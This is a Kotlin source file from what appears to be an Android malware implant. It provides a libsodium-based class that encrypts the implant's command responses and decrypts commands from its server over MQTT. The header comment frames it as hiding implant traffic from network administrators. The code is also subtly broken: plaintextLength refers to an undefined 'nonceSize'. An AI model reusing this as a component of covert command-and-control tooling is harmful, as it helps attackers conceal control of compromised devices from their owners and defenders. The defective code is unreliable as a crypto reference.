/*
* This class provides encryption using the libsodium library.
* It encrypts all command responses before they go out on the wire and decrypt messages
* sent from the server.
* This should not be used as the only layer of protection for traffic, since MQTT traffic with
* encrypted payloads will probably be suspicious to an observant Network Administrator, and I
* probably made a mistake somewhere that will lead to the data being easily decrypted by a real
* cryptographer.
* ALL traffic should still be sent over SSL.
* */
package com.cooperthecoder.implant.crypto

import android.util.Base64
import org.libsodium.jni.Sodium
import java.security.SecureRandom
import javax.security.auth.Destroyable

class NetworkEncryption(val serverPublicKey: ByteArray, val clientPrivateKey: ByteArray) : Destroyable {

    open class CryptoException(e: String) : Exception(e)
    class DecryptionException(e: String) : CryptoException(e)
    class EncryptionException(e: String) : CryptoException(e)

    constructor(serverPublicKey: String, clientPrivateKey: String) : this(
            Base64.decode(serverPublicKey, Base64.DEFAULT),
            Base64.decode(clientPrivateKey, Base64.DEFAULT)
    )

    override fun isDestroyed(): Boolean {
        for (byte in clientPrivateKey) {
            if (byte != 0x00.toByte()) {
                return false
            }
        }
        return true
    }

    override fun destroy() {
        clientPrivateKey.fill(0x00)
    }

    fun encrypt(plaintext: String): String {
        val ciphertext = encrypt(plaintext.toByteArray())
        val encoded = Base64.encodeToString(ciphertext, Base64.DEFAULT)
        return encoded
    }

    fun decrypt(ciphertext: String): String {
        val ciphertextBytes = Base64.decode(ciphertext, Base64.DEFAULT)
        val plaintext = decrypt(ciphertextBytes)
        return String(plaintext)
    }

    private fun encrypt(plaintext: ByteArray): ByteArray {
        val ciphertext = ByteArray(ciphertextLength(plaintext))
        val nonce = nonce()
        val result = Sodium.crypto_box_easy(
                ciphertext,
                plaintext,
                plaintext.size,
                nonce,
                serverPublicKey,
                clientPrivateKey
        )
        if (result != 0) {
            throw EncryptionException("Error encrypting message. Libsodium result code: $result")
        }
        return nonce.plus(ciphertext)
    }

    private fun decrypt(nonceAndCiphertext: ByteArray): ByteArray {
        val plaintext = ByteArray(plaintextLength(nonceAndCiphertext))
        val nonce = nonce(nonceAndCiphertext)
        val ciphertext = nonceAndCiphertext.copyOfRange(nonce.size, nonceAndCiphertext.size)
        val result = Sodium.crypto_box_open_easy(
                plaintext,
                ciphertext,
                ciphertext.size,
                nonce,
                serverPublicKey,
                clientPrivateKey
        )

        if (result != 0) {
            throw DecryptionException("Error decrypting message. Libsodium result code: $result")
        }
        return plaintext
    }

    private fun nonce(ciphertext: ByteArray? = null): ByteArray {
        val nonceSize = Sodium.crypto_box_noncebytes()
        if (ciphertext == null) {
            val nonce = ByteArray(nonceSize)
            SecureRandom().nextBytes(nonce)
            return nonce
        }
        return ciphertext.copyOf(nonceSize)
    }

    private fun ciphertextLength(plaintext: ByteArray): Int = Sodium.crypto_box_macbytes() + plaintext.size

    private fun plaintextLength(ciphertext: ByteArray): Int = ciphertext.size - nonceSize - Sodium.crypto_box_macbytes()
}
